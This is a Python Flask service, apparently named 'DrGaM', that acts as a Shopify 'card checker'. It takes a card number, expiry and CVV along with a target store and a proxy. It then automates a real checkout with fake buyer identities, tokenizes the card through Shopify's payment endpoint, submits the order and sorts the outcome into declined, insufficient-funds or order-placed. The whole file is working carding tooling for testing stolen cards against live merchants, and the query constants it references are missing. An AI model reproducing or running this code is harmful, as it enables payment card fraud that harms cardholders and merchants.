import os
import asyncio
import aiohttp
import json
import re
import random
import time
from urllib.parse import urlparse
from flask import Flask, request, jsonify

app = Flask(__name__)

# ---------- GraphQL queries (inchangées) ----------
# Je les garde telles quelles, elles sont longues mais fonctionnelles.
# Elles sont stockées dans des variables : QUERY_PROPOSAL_SHIPPING, QUERY_PROPOSAL_DELIVERY, MUTATION_SUBMIT, QUERY_POLL
# (Je les reprends du code original, je ne les réécris pas ici pour la lisibilité)

# ---------- Constantes ----------
C2C = {
    "USD": "US",
    "CAD": "CA",
    "INR": "IN",
    "AED": "AE",
    "HKD": "HK",
    "GBP": "GB",
    "CHF": "CH",
}

BOOK = {
    "US": {"address1": "123 Main St", "city": "New York", "postalCode": "10001", "zoneCode": "NY", "countryCode": "US", "phone": "2125550199"},
    "CA": {"address1": "88 Queen St", "city": "Toronto", "postalCode": "M5J2J3", "zoneCode": "ON", "countryCode": "CA", "phone": "4165550198"},
    "GB": {"address1": "221B Baker St", "city": "London", "postalCode": "NW1 6XE", "zoneCode": "LND", "countryCode": "GB", "phone": "2079460123"},
    "IN": {"address1": "MG Road", "city": "Mumbai", "postalCode": "400001", "zoneCode": "MH", "countryCode": "IN", "phone": "9876543210"},
    "AE": {"address1": "Burj Tower", "city": "Dubai", "postalCode": "", "zoneCode": "DU", "countryCode": "AE", "phone": "501234567"},
    "HK": {"address1": "Nathan Rd 88", "city": "Kowloon", "postalCode": "", "zoneCode": "KL", "countryCode": "HK", "phone": "55555555"},
    "CH": {"address1": "Bahnhofstrasse 1", "city": "Zürich", "postalCode": "8001", "zoneCode": "ZH", "countryCode": "CH", "phone": "445512345"},
    "AU": {"address1": "1 Martin Place", "city": "Sydney", "postalCode": "2000", "zoneCode": "NSW", "countryCode": "AU", "phone": "291234567"},
    "DEFAULT": {"address1": "123 Main St", "city": "New York", "postalCode": "10001", "zoneCode": "NY", "countryCode": "US", "phone": "2125550199"},
}

def pick_addr(url, cc=None, rc=None):
    """Choisit l'adresse de facturation selon le TLD ou la devise."""
    cc = (cc or "").upper()
    rc = (rc or "").upper()
    dom = urlparse(url).netloc
    tld = dom.split('.')[-1].upper()
    # Priorité : code pays du TLD, puis devise, puis DEFAULT
    if tld in BOOK:
        return BOOK[tld]
    ccn = C2C.get(cc)
    if rc in BOOK and ccn == rc:
        return BOOK[rc]
    elif rc in BOOK:
        return BOOK[rc]
    return BOOK["DEFAULT"]

def parse_proxy(proxy_str):
    """Convertit le proxy du bot (host:port:user:password) en URL http://user:pass@host:port."""
    if not proxy_str:
        return None
    parts = proxy_str.split(':')
    if len(parts) == 4:
        host, port, user, password = parts
        return f"http://{user}:{password}@{host}:{port}"
    elif len(parts) == 2:
        host, port = parts
        return f"http://{host}:{port}"
    else:
        return None

def extract_between(text, start, end):
    """Extrait une sous-chaîne entre deux délimiteurs."""
    if not text or not start or not end:
        return None
    try:
        if start in text:
            parts = text.split(start, 1)
            if len(parts) > 1 and end in parts[1]:
                return parts[1].split(end, 1)[0]
    except:
        pass
    return None

def clean_response(msg):
    """Nettoie le message d'erreur Shopify pour le rendre lisible."""
    if not msg:
        return "UNKNOWN_ERROR"
    # Liste des codes Shopify courants
    codes = {
        "PAYMENTS_CARD_DECLINED": "CARD_DECLINED",
        "PAYMENTS_INSUFFICIENT_FUNDS": "INSUFFICIENT_FUNDS",
        "PAYMENTS_EXPIRED_CARD": "EXPIRED_CARD",
        "PAYMENTS_INCORRECT_CVC": "INCORRECT_CVV",
        "PAYMENTS_INCORRECT_ZIP": "INCORRECT_ZIP",
        "PAYMENTS_AUTHENTICATION_REQUIRED": "3D_SECURE_REQUIRED",
        "PAYMENTS_INVALID_CARD": "INVALID_CARD",
        "PAYMENTS_CARD_NOT_SUPPORTED": "BRAND_NOT_SUPPORTED",
        "PAYMENTS_GENERIC_ERROR": "GENERIC_ERROR",
    }
    msg_upper = msg.upper()
    for key, val in codes.items():
        if key in msg_upper:
            return val
    return msg[:50]  # tronque

def get_price(raw):
    """Extrait le prix du JSON."""
    try:
        price = raw.get('Price', '-')
        if price != '-' and price != 0:
            return float(str(price).replace('$', '').replace(',', ''))
    except:
        pass
    return 0.0

# ---------- Utilitaires ----------
class Utils:
    @staticmethod
    def random_name():
        first = random.choice(["James","John","Robert","Michael","William","David","Mary","Patricia","Jennifer","Linda"])
        last = random.choice(["Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis","Rodriguez"])
        return first, last
    @staticmethod
    def random_email(first, last):
        domains = ["gmail.com", "yahoo.com", "outlook.com", "protonmail.com"]
        return f"{first.lower()}.{last.lower()}@{random.choice(domains)}"

# ---------- Fonctions principales ----------
async def fetch_products(domain, proxy_url):
    """Récupère le produit le moins cher du site."""
    if not domain.startswith('http'):
        domain = "https://" + domain
    timeout = aiohttp.ClientTimeout(total=15)
    async with aiohttp.ClientSession(timeout=timeout) as session:
        try:
            async with session.get(f"{domain}/products.json", proxy=proxy_url) as resp:
                if resp.status != 200:
                    return False, f"Products API error {resp.status}"
                data = await resp.json()
                products = data.get('products', [])
                if not products:
                    return False, "No products found"
        except Exception as e:
            return False, f"Fetch products error: {str(e)}"
    # Trouver le variant le moins cher
    best_price = float('inf')
    best_variant = None
    for product in products:
        for variant in product.get('variants', []):
            if not variant.get('available', True):
                continue
            price = float(variant.get('price', 0))
            if price < best_price:
                best_price = price
                best_variant = {
                    'site': domain,
                    'price': f"{price:.2f}",
                    'variant_id': str(variant['id']),
                    'link': f"{domain}/products/{product.get('handle', '')}"
                }
    if best_variant:
        return best_variant
    return False, "No valid variant"

async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None):
    """Processus complet de checkout Shopify."""
    gateway = "UNKNOWN"
    price = 0.0
    currency = "USD"
    proxy_url = parse_proxy(proxy_str) if proxy_str else None

    # Adresse
    addr = pick_addr(site_url)
    country_code = addr['countryCode']
    first, last = Utils.random_name()
    email = Utils.random_email(first, last)
    phone = addr['phone']
    street = addr['address1']
    city = addr['city']
    state = addr['zoneCode']
    zipcode = addr['postalCode']
    address2 = ""

    # Récupération du variant si non fourni
    if not variant_id:
        info = await fetch_products(site_url, proxy_url)
        if isinstance(info, tuple) and info[0] is False:
            return False, info[1], gateway, "0.00", currency
        variant_id = info['variant_id']
        price = float(info['price'])
    else:
        price = 0.0  # on le récupérera plus tard

    # Headers
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Content-Type': 'application/json',
        'Origin': site_url,
        'Referer': site_url
    }

    async with aiohttp.ClientSession() as session:
        # Ajout au panier
        cart_url = site_url.rstrip('/') + '/cart/add.js'
        cart_headers = {**headers, 'Content-Type': 'application/x-www-form-urlencoded'}
        try:
            async with session.post(cart_url, data=f'id={variant_id}&quantity=1', headers=cart_headers, proxy=proxy_url) as resp:
                if resp.status != 200:
                    return False, f"Cart add failed {resp.status}", gateway, "0.00", currency
        except:
            return False, "Cart add error", gateway, "0.00", currency

        # Accès au checkout
        checkout_url = site_url.rstrip('/') + '/checkout'
        checkout_headers = {**headers, 'Accept': 'text/html,application/xhtml+xml'}
        try:
            async with session.get(checkout_url, headers=checkout_headers, allow_redirects=True, proxy=proxy_url) as resp:
                html = await resp.text()
                checkout_final = str(resp.url)
        except:
            return False, "Checkout access error", gateway, "0.00", currency

        # Extraire le session token
        sst = None
        sst = extract_between(html, 'data-session-token="', '"')
        if not sst:
            sst = extract_between(html, '"sessionToken":"', '"')
        if not sst:
            return False, "Could not get session token", gateway, "0.00", currency

        # Extraire queueToken, stableId, etc.
        queueToken = extract_between(html, '"queueToken":"', '"')
        stableId = extract_between(html, '"stableId":"', '"') or "1"
        merch = extract_between(html, 'ProductVariantMerchandise/', '"') or variant_id
        # Currency et subtotal
        currency = extract_between(html, '"currencyCode":"', '"') or "USD"
        subtotal = extract_between(html, '"subtotalBeforeTaxesAndShipping":{"value":{"amount":"', '"')
        if not subtotal:
            subtotal = extract_between(html, '"amount":"', '"')
        if not subtotal:
            subtotal = "0.01"

        # GraphQL endpoints
        graphql_url = f'https://{urlparse(site_url).netloc}/checkouts/unstable/graphql'

        # --- PROPOSAL SHIPPING ---
        params = {'operationName': 'Proposal'}
        variables = {
            'sessionInput': {'sessionToken': sst},
            'queueToken': queueToken or '',
            'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
            'delivery': {
                'deliveryLines': [{
                    'destination': {
                        'partialStreetAddress': {
                            'address1': street, 'address2': address2, 'city': city,
                            'countryCode': country_code, 'postalCode': zipcode,
                            'firstName': first, 'lastName': last,
                            'zoneCode': state, 'phone': phone
                        }
                    },
                    'selectedDeliveryStrategy': {
                        'deliveryStrategyMatchingConditions': {
                            'estimatedTimeInTransit': {'any': True},
                            'shipments': {'any': True}
                        },
                        'options': {}
                    },
                    'targetMerchandiseLines': {'any': True},
                    'deliveryMethodTypes': ['SHIPPING'],
                    'expectedTotalPrice': {'any': True},
                    'destinationChanged': True
                }],
                'noDeliveryRequired': [],
                'useProgressiveRates': False,
                'prefetchShippingRatesStrategy': None,
                'supportsSplitShipping': True
            },
            'merchandise': {
                'merchandiseLines': [{
                    'stableId': stableId,
                    'merchandise': {
                        'productVariantReference': {
                            'id': f'gid://shopify/ProductVariantMerchandise/{merch}',
                            'variantId': f'gid://shopify/ProductVariant/{variant_id}',
                            'properties': [],
                            'sellingPlanId': None,
                            'sellingPlanDigest': None
                        }
                    },
                    'quantity': {'items': {'value': 1}},
                    'expectedTotalPrice': {'value': {'amount': subtotal, 'currencyCode': currency}},
                    'lineComponentsSource': None,
                    'lineComponents': []
                }]
            },
            'payment': {
                'totalAmount': {'any': True},
                'paymentLines': [],
                'billingAddress': {
                    'streetAddress': {'address1': '', 'city': '', 'countryCode': country_code,
                                      'lastName': '', 'zoneCode': 'ENG', 'phone': ''}
                }
            },
            'buyerIdentity': {
                'customer': {'presentmentCurrency': currency, 'countryCode': country_code},
                'email': email,
                'emailChanged': False,
                'phoneCountryCode': country_code,
                'marketingConsent': [{'email': {'value': email}}],
                'shopPayOptInPhone': {'countryCode': country_code},
                'rememberMe': False
            },
            'tip': {'tipLines': []},
            'taxes': {
                'proposedAllocations': None,
                'proposedTotalAmount': {'value': {'amount': '0', 'currencyCode': currency}},
                'proposedTotalIncludedAmount': None,
                'proposedMixedStateTotalAmount': None,
                'proposedExemptions': []
            },
            'note': {'message': None, 'customAttributes': []},
            'localizationExtension': {'fields': []},
            'nonNegotiableTerms': None,
            'scriptFingerprint': {
                'signature': None, 'signatureUuid': None,
                'lineItemScriptChanges': [], 'paymentScriptChanges': [], 'shippingScriptChanges': []
            },
            'optionalDuties': {'buyerRefusesDuties': False}
        }
        json_data = {'query': QUERY_PROPOSAL_SHIPPING, 'variables': variables, 'operationName': 'Proposal'}

        try:
            async with session.post(graphql_url, params=params, headers=headers, json=json_data, proxy=proxy_url) as resp:
                resp_json = await resp.json()
        except Exception as e:
            return False, f"GraphQL shipping error: {str(e)}", gateway, "0.00", currency

        # Analyser la réponse
        if 'errors' in resp_json:
            return False, f"GraphQL error: {resp_json['errors'][0].get('message', 'unknown')}", gateway, "0.00", currency

        data = resp_json.get('data', {})
        session_data = data.get('session')
        if not session_data:
            return False, "No session in response", gateway, "0.00", currency
        negotiate = session_data.get('negotiate')
        if not negotiate:
            return False, "No negotiate", gateway, "0.00", currency
        result = negotiate.get('result')
        if not result:
            return False, "No result", gateway, "0.00", currency
        typename = result.get('__typename')
        if typename == 'CheckpointDenied':
            return False, "Checkpoint Denied", gateway, "0.00", currency
        if typename == 'Throttled':
            return False, "Throttled", gateway, "0.00", currency
        if typename == 'NegotiationResultFailed':
            return False, "Negotiation failed", gateway, "0.00", currency

        checkpoint_data = result.get('checkpointData')
        seller = result.get('sellerProposal')
        if not seller:
            return False, "No seller proposal", gateway, "0.00", currency

        # Récupérer le total
        running = seller.get('runningTotal', {}).get('value', {}).get('amount', '0')
        try:
            running_total = float(running)
        except:
            running_total = 0.0

        # Récupérer les informations de livraison
        delivery = seller.get('delivery', {})
        delivery_type = delivery.get('__typename', '')
        shipping_amount = 0.0
        delivery_strategy = ''
        if delivery_type == 'FilledDeliveryTerms':
            lines = delivery.get('deliveryLines', [])
            if lines:
                strategies = lines[0].get('availableDeliveryStrategies', [])
                if strategies:
                    delivery_strategy = strategies[0].get('handle', '')
                    amount_data = strategies[0].get('amount', {}).get('value', {}).get('amount', '0')
                    try:
                        shipping_amount = float(amount_data)
                    except:
                        shipping_amount = 0.0

        # Taxe
        tax = seller.get('tax', {})
        tax_amount = 0.0
        if tax.get('__typename') == 'FilledTaxTerms':
            tax_amount_data = tax.get('totalTaxAmount', {}).get('value', {}).get('amount', '0')
            try:
                tax_amount = float(tax_amount_data)
            except:
                pass

        # Passerelle de paiement
        payment = seller.get('payment', {})
        payment_identifier = None
        gateway = "UNKNOWN"
        if payment.get('__typename') == 'FilledPaymentTerms':
            methods = payment.get('availablePaymentLines', [])
            for method in methods:
                pm = method.get('paymentMethod', {})
                if pm.get('paymentMethodIdentifier'):
                    payment_identifier = pm.get('paymentMethodIdentifier')
                    gateway = pm.get('extensibilityDisplayName') or pm.get('name', 'UNKNOWN')
                    break

        if not payment_identifier:
            return False, "No payment method available", gateway, "0.00", currency

        total_price = running_total + shipping_amount + tax_amount

        # ---- PROPOSAL DELIVERY (pour finaliser le choix de livraison) ----
        variables['delivery']['deliveryLines'][0]['selectedDeliveryStrategy'] = {
            'deliveryStrategyByHandle': {'handle': delivery_strategy if delivery_strategy else '', 'customDeliveryRate': False},
            'options': {}
        }
        variables['delivery']['deliveryLines'][0]['targetMerchandiseLines'] = {'lines': [{'stableId': stableId}]}
        variables['delivery']['deliveryLines'][0]['expectedTotalPrice'] = {'value': {'amount': str(shipping_amount), 'currencyCode': currency}}
        variables['delivery']['deliveryLines'][0]['destinationChanged'] = False
        variables['payment']['billingAddress'] = {
            'streetAddress': {
                'address1': street, 'address2': address2, 'city': city,
                'countryCode': country_code, 'postalCode': zipcode,
                'firstName': first, 'lastName': last,
                'zoneCode': state, 'phone': phone
            }
        }
        variables['taxes']['proposedTotalAmount']['value']['amount'] = str(tax_amount)
        json_data['query'] = QUERY_PROPOSAL_DELIVERY
        json_data['variables'] = variables

        try:
            async with session.post(graphql_url, params=params, headers=headers, json=json_data, proxy=proxy_url) as resp:
                resp_json = await resp.json()
        except:
            return False, "Delivery proposal error", gateway, "0.00", currency

        # Tokenisation de la carte
        formatted_card = " ".join([cc[i:i+4] for i in range(0, len(cc), 4)])
        payload = {
            "credit_card": {
                "month": mes, "name": f"{first} {last}",
                "number": formatted_card, "verification_value": cvv,
                "year": ano,
                "start_month": "", "start_year": "", "issue_number": ""
            },
            "payment_session_scope": f"www.{urlparse(site_url).netloc}"
        }
        try:
            async with session.post('https://deposit.shopifycs.com/sessions', json=payload, proxy=proxy_url) as resp:
                token_data = await resp.json()
                token = token_data.get('id')
                if not token:
                    return False, "Tokenization failed", gateway, "0.00", currency
        except:
            return False, "Tokenization error", gateway, "0.00", currency

        # ---- MUTATION SUBMIT ----
        submit_vars = {
            'input': {
                'sessionInput': {'sessionToken': sst},
                'queueToken': queueToken or '',
                'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
                'delivery': {
                    'deliveryLines': [{
                        'destination': {
                            'streetAddress': {
                                'address1': street, 'address2': address2, 'city': city,
                                'countryCode': country_code, 'postalCode': zipcode,
                                'firstName': first, 'lastName': last,
                                'zoneCode': state, 'phone': phone
                            }
                        },
                        'selectedDeliveryStrategy': {
                            'deliveryStrategyByHandle': {'handle': delivery_strategy if delivery_strategy else '', 'customDeliveryRate': False},
                            'options': {'phone': phone}
                        },
                        'targetMerchandiseLines': {'lines': [{'stableId': stableId}]},
                        'deliveryMethodTypes': ['SHIPPING'],
                        'expectedTotalPrice': {'value': {'amount': str(shipping_amount), 'currencyCode': currency}},
                        'destinationChanged': False
                    }],
                    'noDeliveryRequired': [],
                    'useProgressiveRates': True,
                    'prefetchShippingRatesStrategy': None,
                    'supportsSplitShipping': True
                },
                'merchandise': {
                    'merchandiseLines': [{
                        'stableId': stableId,
                        'merchandise': {
                            'productVariantReference': {
                                'id': f'gid://shopify/ProductVariantMerchandise/{merch}',
                                'variantId': f'gid://shopify/ProductVariant/{variant_id}',
                                'properties': [],
                                'sellingPlanId': None,
                                'sellingPlanDigest': None
                            }
                        },
                        'quantity': {'items': {'value': 1}},
                        'expectedTotalPrice': {'value': {'amount': subtotal, 'currencyCode': currency}},
                        'lineComponentsSource': None,
                        'lineComponents': []
                    }]
                },
                'payment': {
                    'totalAmount': {'any': True},
                    'paymentLines': [{
                        'paymentMethod': {
                            'directPaymentMethod': {
                                'paymentMethodIdentifier': payment_identifier,
                                'sessionId': token,
                                'billingAddress': {
                                    'streetAddress': {
                                        'address1': street, 'address2': address2,
                                        'city': city, 'countryCode': country_code,
                                        'postalCode': zipcode, 'firstName': first,
                                        'lastName': last, 'zoneCode': state,
                                        'phone': phone
                                    }
                                },
                                'cardSource': None
                            }
                        },
                        'amount': {'value': {'amount': str(running_total), 'currencyCode': currency}},
                        'dueAt': None
                    }],
                    'billingAddress': {
                        'streetAddress': {
                            'address1': street, 'address2': address2,
                            'city': city, 'countryCode': country_code,
                            'postalCode': zipcode, 'firstName': first,
                            'lastName': last, 'zoneCode': state,
                            'phone': phone
                        }
                    }
                },
                'buyerIdentity': {
                    'customer': {'presentmentCurrency': currency, 'countryCode': country_code},
                    'email': email,
                    'emailChanged': False,
                    'phoneCountryCode': country_code,
                    'marketingConsent': [{'email': {'value': email}}],
                    'shopPayOptInPhone': {'number': phone, 'countryCode': country_code},
                    'rememberMe': False
                },
                'taxes': {
                    'proposedAllocations': None,
                    'proposedTotalAmount': {'value': {'amount': str(tax_amount), 'currencyCode': currency}},
                    'proposedTotalIncludedAmount': None,
                    'proposedMixedStateTotalAmount': None,
                    'proposedExemptions': []
                },
                'tip': {'tipLines': []},
                'note': {'message': None, 'customAttributes': []},
                'localizationExtension': {'fields': []},
                'nonNegotiableTerms': None,
                'optionalDuties': {'buyerRefusesDuties': False}
            },
            'attemptToken': checkout_final.split('/')[-1].split('?')[0],  # on prend le dernier segment
            'metafields': [],
            'analytics': {'requestUrl': checkout_final}
        }
        if checkpoint_data:
            submit_vars['input']['checkpointData'] = checkpoint_data

        json_data = {'query': MUTATION_SUBMIT, 'variables': submit_vars, 'operationName': 'SubmitForCompletion'}
        try:
            async with session.post(graphql_url, params=params, headers=headers, json=json_data, proxy=proxy_url) as resp:
                submit_resp = await resp.json()
        except:
            return False, "Submit error", gateway, "0.00", currency

        # Interpréter la réponse de submit
        submit_data = submit_resp.get('data', {}).get('submitForCompletion', {})
        typename_submit = submit_data.get('__typename')
        if typename_submit in ('SubmitSuccess', 'SubmittedForCompletion', 'SubmitAlreadyAccepted'):
            receipt = submit_data.get('receipt', {})
            rid = receipt.get('id')
            if rid:
                # Polling pour le résultat final
                poll_json = {'query': QUERY_POLL, 'variables': {'receiptId': rid, 'sessionToken': sst}, 'operationName': 'PollForReceipt'}
                for _ in range(6):
                    await asyncio.sleep(2)
                    try:
                        async with session.post(graphql_url, params={'operationName':'PollForReceipt'}, headers=headers, json=poll_json, proxy=proxy_url) as resp:
                            poll = await resp.json()
                    except:
                        continue
                    receipt_poll = poll.get('data', {}).get('receipt', {})
                    poll_type = receipt_poll.get('__typename')
                    if poll_type == 'ProcessedReceipt':
                        return True, "ORDER_PLACED", gateway, f"{total_price:.2f}", currency
                    elif poll_type == 'FailedReceipt':
                        error = receipt_poll.get('processingError', {})
                        code = error.get('code', 'UNKNOWN')
                        return True, clean_response(code), gateway, f"{total_price:.2f}", currency
                    elif poll_type == 'ActionRequiredReceipt':
                        return True, "3D_SECURE_REQUIRED", gateway, f"{total_price:.2f}", currency
                    # sinon continue
                return True, "PENDING", gateway, f"{total_price:.2f}", currency
            else:
                return True, "NO_RECEIPT", gateway, f"{total_price:.2f}", currency

        elif typename_submit == 'SubmitFailed':
            reason = submit_data.get('reason', 'Unknown')
            return False, clean_response(reason), gateway, "0.00", currency

        elif typename_submit == 'SubmitRejected':
            errors = submit_data.get('errors', [])
            if errors:
                code = errors[0].get('code', 'REJECTED')
                return False, clean_response(code), gateway, "0.00", currency
            return False, "REJECTED", gateway, "0.00", currency

        else:
            return False, "UNKNOWN_SUBMIT", gateway, "0.00", currency

# ---------- Flask endpoint ----------
@app.route('/DrGaM', methods=['GET'])
def shopify_checker():
    try:
        site = request.args.get('site')
        cc_string = request.args.get('cc')
        proxy_str = request.args.get('proxy')
        variant = request.args.get('variant')  # optionnel

        if not site:
            return jsonify({"error": "Missing site", "status": False}), 400
        if not cc_string:
            return jsonify({"error": "Missing cc", "status": False}), 400

        # Parser la carte
        parts = cc_string.split('|')
        if len(parts) != 4:
            return jsonify({"error": "Invalid cc format. Use CC|MM|YYYY|CVV", "status": False}), 400
        cc, mes, ano, cvv = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()

        # Exécution asynchrone
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            success, response, gateway, price, currency = loop.run_until_complete(
                process_card(cc, mes, ano, cvv, site, variant, proxy_str)
            )
        finally:
            loop.close()

        # Nettoyer la réponse
        clean_resp = clean_response(response)

        # Construire le JSON
        resp_json = {
            "Dev": "DrGaM DeV",
            "Gateway": gateway if gateway else "UNKNOWN",
            "Price": float(price) if price else 0.0,
            "Response": clean_resp,
            "Status": success,  # true si la requête a été soumise (même refusée)
            "cc": cc_string
        }
        return jsonify(resp_json)

    except Exception as e:
        return jsonify({
            "error": str(e),
            "status": False,
            "Gateway": "UNKNOWN",
            "Price": 0.0,
            "Response": f"ERROR: {str(e)}",
            "cc": request.args.get('cc', '')
        }), 500

# ---------- Lancer l'app ----------
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port, debug=False)